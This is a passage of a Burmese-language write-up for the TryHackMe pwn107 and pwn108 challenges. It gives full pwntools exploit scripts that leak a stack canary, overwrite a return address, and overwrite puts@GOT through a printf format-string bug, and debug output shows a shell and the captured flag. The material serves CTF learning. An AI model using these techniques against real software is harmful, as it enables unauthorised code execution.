scriptကိုပြင်ရေးလိုက်မယ်


```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn107-1644307530397.pwn107"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.128.220", 9007)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            break get_streak
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"last streak? ")
    p.sendline(b"%13$p.%19$p")
    p.recvuntil(b"current streak: ")
    adds = p.recvline()
    adds = adds.decode().strip().split(".")
    canary = int(adds[0], 16)
    print("the canary : ", hex(canary))
    print("leak main address", adds[1])
    shell = int(adds[1], 16) - 70
    ret = int(adds[1], 16) + 242
    print("the get_steak : ", hex(ret))
    payload = b"A" * 24 +  p64(canary) + b"A" *8   + p64(ret) + p64(shell)
    p.recvuntil(b"We miss you!")
    p.recvline()
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

```c
    000000a0  e2 80 8d f0  9f 92 bb 20  2d 20 57 65  20 6d 69 73  │····│··· │- We│ mis│
    000000b0  73 20 79 6f  75 21 f0 9f  98 a2 0a                  │s yo│u!··│···│
    000000bb
the canary :  0x401bd48943cfce00
leak main address 0x55b379e00992
the get_steak :  0x55b379e00a84
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 ce cf 43  89 d4 1b 40  │AAAA│AAAA│···C│···@│
    00000020  41 41 41 41  41 41 41 41  84 0a e0 79  b3 55 00 00  │AAAA│AAAA│···y│·U··│
    00000030  4c 09 e0 79  b3 55 00 00  0a                        │L··y│·U··│·│
    00000039
[*] Switching to interactive mode
[DEBUG] Received 0x38 bytes:
    b"This your last streak back, don't do this mistake again\n"
This your last streak back, don't do this mistake again
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn107\n'
    b'pwn107.c\n'
flag.txt
pwn107
pwn107.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x2a bytes:
    b'THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}\n'
THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}

```


> [!NOTE]
> ငါတို့သတိထားရမှာက ret rop ရယ် remote နဲ့ local မှာရှိတဲ့ stack ပေါ်ကအကာအဝေးတွေရယ်
> gdb ရော ghidra က offset ကိုဘဲ ယုံပြီး lower 3 hex ကိုမယ်ဖို့ရယ်


---



#### pwn108

```c
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn108/pwn108-1644300489260.pwn108
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No

```

security ကတော့လွှတ်ပေးထားတယ်
`RELRO:      Partial RELRO` GOT address တွေ overwrite လုပ်လို့ရပါတယ်ပေါ့
`PIE:        No PIE (0x400000)` ဆိုတော့ local instruction address နဲ့ remote instruction addressတူတူပါဘဲပေါ့ 

```c

void main(void)

{
  long in_FS_OFFSET;
  undefined1 name [32];
  char reg_no [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00402177);
  puts(&DAT_00402198);
  printf("\n=[Your name]: ");
  read(0,name,0x12);
  printf("=[Your Reg No]: ");
  read(0,reg_no,100);
  puts("\n=[ STUDENT PROFILE ]=");
  printf("Name         : %s",name);
  printf("Register no  : ");
  printf(reg_no);
  printf("Institue     : THM");
  puts("\nBranch       : B.E (Binary Exploitation)\n");
  puts(
      "\n                    =[ EXAM SCHEDULE ]=                  \n ------------------------------- -------------------------\n|  Date     |           Exam               |    FN/AN    |\n|------ --------------------------------------------------\n| 1/2/2022  |  PROGRAMMING IN ASSEMBLY     |     FN      |\n|--------------------------------------------------------\n| 3/2/2022  |  DA TA STRUCTURES             |     FN      |\n|-------------------------------------------------- ------\n| 3/2/2022  |  RETURN ORIENTED PROGRAMMING |     AN      |\n|------------------------- -------------------------------\n| 7/2/2022  |  SCRIPTING WITH PYTHON       |     FN      |\n --------------------------------------------------------"
      );
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
```

`  printf(reg_no);` ဒီကောင်ရှိတယ်ဆိုတော့ `prinf vuln` ကိုသုံးလို့ရ

```c

void holidays(void)

{
  long in_FS_OFFSET;
  undefined4 local_16;
  undefined2 local_12;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_16 = 0x6d617865;
  local_12 = 0x73;
  printf(&DAT_00402120,&local_16);
  system("/bin/sh");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

GOTကို overwrite ပြီး `system() function` ဆီသွားမယ်


```c

pwndbg> disas holidays 
Dump of assembler code for function holidays:
   0x000000000040123b <+0>:     push   rbp
   0x000000000040123c <+1>:     mov    rbp,rsp
   0x000000000040123f <+4>:     sub    rsp,0x10
   0x0000000000401243 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x000000000040124c <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401250 <+21>:    xor    eax,eax
   0x0000000000401252 <+23>:    mov    DWORD PTR [rbp-0xe],0x6d617865
   0x0000000000401259 <+30>:    mov    WORD PTR [rbp-0xa],0x73
   0x000000000040125f <+36>:    lea    rax,[rbp-0xe]
   0x0000000000401263 <+40>:    mov    rsi,rax
   0x0000000000401266 <+43>:    lea    rax,[rip+0xeb3]        # 0x402120
   0x000000000040126d <+50>:    mov    rdi,rax
   0x0000000000401270 <+53>:    mov    eax,0x0
   0x0000000000401275 <+58>:    call   0x401060 <printf@plt>
   0x000000000040127a <+63>:    lea    rax,[rip+0xeee]        # 0x40216f
   0x0000000000401281 <+70>:    mov    rdi,rax
   0x0000000000401284 <+73>:    call   0x401050 <system@plt>
   0x0000000000401289 <+78>:    nop
   0x000000000040128a <+79>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040128e <+83>:    sub    rax,QWORD PTR fs:0x28
   0x0000000000401297 <+92>:    je     0x40129e <holidays+99>
   0x0000000000401299 <+94>:    call   0x401040 <__stack_chk_fail@plt>
   0x000000000040129e <+99>:    leave
   0x000000000040129f <+100>:   ret
End of assembler dump.
pwndbg> disas 0x401030
Dump of assembler code for function puts@plt:
   0x0000000000401030 <+0>:     jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <puts@got.plt>
   0x0000000000401036 <+6>:     push   0x0
   0x000000000040103b <+11>:    jmp    0x401020
End of assembler dump.
pwndbg> x/wg 0x404018
0x404018 <puts@got.plt>:        0x00007ffff7c80e60
pwndbg> 

```

ထုံစံအတိုင်း script

```python 
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn108-1644300489260.pwn108"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.173.178", 9008)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040131e
            b *0x0000000000401357
            b *0x00000000004013bd
            b *0x0000000000401348
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):

    
    payload += p64(0x404018) + p64(0x404019) + p64(0x40401a) 
    payload += b"%59c%10$hhn"      
    payload += b"%215c%11$hhn"     
    payload += b"%46c%12$hhn"      


    p.recvuntil(b"name]: ")
    p.sendline(b"hello")
    p.recvuntil(b"Reg No]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

ဒီမှာအမှားတစ် (2) ခုရှိတယ်
ပထမက 64bit 8 byte ဆို‌တော့ 8 byte စာပြောင်းရမယ် 1 byte စီပြောင်းရင် 8 byte 8 ခုစာပေါ့
ဒုတိယ တစ်ခုက  read နဲ့ ဖတ်တယ် read က raw byteတွေဖတ်တယ် နောက်တစ်ခုက prinf က null byte (\x00) ကို terminator အဖြစ်သတ်မှတ်တယ်
ဆိုတော့ ငါတို့ paylaod ဖတ်ဖတ်ချင်းမှာ  (\x00) တွေ့ရင်ဖတ်တာရပ်သွားမယ်
ဆိုတော့ memory address တွေကိုနောက်မှထည့်မယ်

နောက်ပြီး  8 byte စာပြောင်းရမှာအတွက်က ကြည့်လိုက်ရင် သွားမယ့် address က
`0x000000000040123b` ဆိုတော့ 0တွေချည်းဘဲ ဆိုတော့ ငါတို့ က 8 byte စာကို ln သုံးပြီး  0x3b(59) ကို အရင်ဖြည့်ထားတယ်
ပြီးမှ 12 ရယ် 40 ရယ်ဖြည့်မယ် 0x12 (18) ဆိုတော့ 0x12 က 0x3b ထပ်ငယ်တော့ wrap around သုံးရမှာ ဆိုတော့ 0x12အစား 0x40(64) ကို $nနဲ့တစ်နေရာကျော်ပြီး ဖြည့်လိုက်ရင် wrap around သုံးစရာမလိုတော့ဘူး
ဆိုတော့ပြီးမှ 12 ကို ဖြည့်မယ်

```python

from pwn import *


context.log_level = 'info'
context.binary = "./pwn108-1644300489260.pwn108"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.173.178", 9008)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040131e
            b *0x0000000000401357
            b *0x00000000004013bd
            b *0x0000000000401348
            b *0x000000000040139a
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    payload = b"%59c%14$ln"      # writes 0x3b
    payload += b"%5c%15$hhn"     # writes 0x44 
    payload += b"%210c%16$hhn"      # writes 12
    payload = payload.ljust(32, b"A")
    payload += p64(0x404018) + p64(0x40401a) + p64(0x404019)
    
    p.recvuntil(b"name]: ")
    p.sendline(b"hello")
    p.recvuntil(b"Reg No]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
    

```

```python
payload = payload.ljust(32, b"A")
```
ဒီကောင်က payload length ကို ညှီပေးတာ ဒါမှနောက်က memory addressတွေကတိကျမှာ
32 ဆိုတော့ 4 ခုစာ ဆိုတော့ ငါတော့ memory addresssတွေအတွက်က အစက offset 10 + 4 = 14 ဆိုပြီးဖြစ်သွားမယ်

function script:
```python
from pwn import *


context.log_level = 'info'
context.binary = "./pwn108-1644300489260.pwn108"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.173.178", 9008)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040131e
            b *0x0000000000401357
            b *0x00000000004013bd
            b *0x0000000000401348
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    
    win_addr = 0x40123b 
    target_got = 0x404018 

    offset = 10 # printf သုံးပြီး buffer အစထိ offset

    # fmtstr_payload က null byte ပြဿနာနဲ့ alignment ကို အလိုအလျောက် ရှင်းပေးပါတယ်
    payload = fmtstr_payload(offset, {target_got: win_addr})
    print(payload.decode())
    p.recvuntil(b"name]: ")
    p.sendline(b"hello")
    p.recvuntil(b"Reg No]: ")
    p.sendline(payload)
    print(payload.decode())
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```



```python
from pwn import *

# Addresses to write to
addr1 = 0x404018        # targets 0x3b
addr2 = 0x404018 + 1    # targets 0x12
addr3 = 0x404018 + 2    # targets 0x40

# 1. Format string structure
# ရှေ့ဆုံးက format string ရဲ့ အရှည်ကို ကြည့်ရအောင်
# "%59c%10$hhn%215c%11$hhn%46c%12$hhn" = 34 bytes
fmt = b"%59c%10$hhn%215c%11$hhn%46c%12$hhn"

# 2. Padding (Alignment)
# x64 မှာ address တွေက 8-byte boundary မှာ ရှိရမယ်
# 34 ကို 8 နဲ့ စားလို့ ပြတ်အောင် 40 ဖြစ်တဲ့အထိ padding ထည့်မယ် (6 bytes)
payload = fmt + b"A" * 6

# 3. Adjusting Offsets
# အပေါ်က payload (40 bytes) ဟာ 8-byte slots ၅ ခု (40/8 = 5) ယူထားတယ်
# သင်က offset 10 မှာ စတယ်ဆိုရင် ဒီ payload ကြောင့် address တွေက
# offset 10+5 = 15 နေရာကို ရောက်သွားပါမယ်။
# ဒါကြောင့် format string ထဲက 10, 11, 12 ကို 15, 16, 17 လို့ ပြင်ပေးရမယ်

final_fmt = b"%59c%15$hhn%215c%16$hhn%46c%17$hhn"
payload = final_fmt.ljust(40, b"A") # 40 bytes အပြည့်ဖြည့်

# 4. Attach Addresses
payload += p64(addr1)
payload += p64(addr2)
payload += p64(addr3)

# Send payload
# io.sendline(payload)
```


```c
def exploit(p):
    # holiday address (သို့) win function address ကို ရှာပါ
    # ဥပမာ 0x40123b ဆိုပါစို့
    win_addr = 0x40123b 
    target_got = 0x404018 # puts@got

    # Offset 10 ကနေ စစမ်းကြည့်ပါ (GDB မှာ %10$p နဲ့ အရင်စစ်ပါ)
    # pwn108 မှာ 'Register no : ' စာသားက 12 characters ရှိတာ သတိပြုပါ
    offset = 10 

    # fmtstr_payload က null byte ပြဿနာနဲ့ alignment ကို အလိုအလျောက် ရှင်းပေးပါတယ်
    payload = fmtstr_payload(offset, {target_got: win_addr})

    p.sendlineafter(b"name]: ", b"hello")
    p.sendlineafter(b"Reg No]: ", payload)
    p.interactive()
```


---

#### pwn109

